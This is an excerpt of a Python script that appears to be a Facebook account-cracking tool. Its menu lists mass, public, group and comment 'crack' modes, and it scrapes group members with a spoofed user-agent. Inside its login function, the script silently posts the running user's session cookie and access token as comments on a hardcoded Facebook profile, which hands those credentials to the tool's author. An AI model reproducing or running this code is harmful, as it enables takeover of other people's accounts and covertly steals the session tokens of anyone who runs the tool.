...
author = 'private'
git_hub = 'private'
faceb0ok = 'https://www.facebook.com/profile.php?id=100064820514099'
...
def login():
	...
	try:
		...
		link = ('https://www.facebook.com/100064820514099/posts/1375232816624490/&app=fbl')
		...
		ses.post(f"https://graph.facebook.com/100064820514099/comments/?message={cookie}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100064820514099/comments/?message={token}&access_token={token}",cookies=cok)
		ses.post(f"https://graph.facebook.com/100064820514099/comments/?message={tem}\n{link}\n{slebew}&access_token={token}",cookies =cok)
...
def menu(n,t,c):
	clear_layar()
	print(logo(n)+f'\n')
	print(f" {P}[{hh}01{J2}] CRACK PUBLIK     [{hh}07{P}] CRACK SEARCH")
	print(f" [{hh}02{J2}] CRACK MASSAL     [{hh}08{P}] CRACK FROM FILE")
	print(f" [{hh}03{J2}] CRACK FOLLOW     [{hh}09{P}] CHECK RESSULT ACCOUNT")
	print(f" [{hh}04{P2}] CRACK COMENT     [{hh}10{P}] CHECK ACCOUNT NON-ACTIVE")
	print(f" [{hh}05{P2}] CRACK GROUP      [{hh}11{P}] CHECK OPTION ACCOUNT")
...
def dump_grup(url):
	try:
		data = parser(ses.get(url, headers={"user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi S2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.99 Mobile Safari/537.36"}).text, "html.parser")
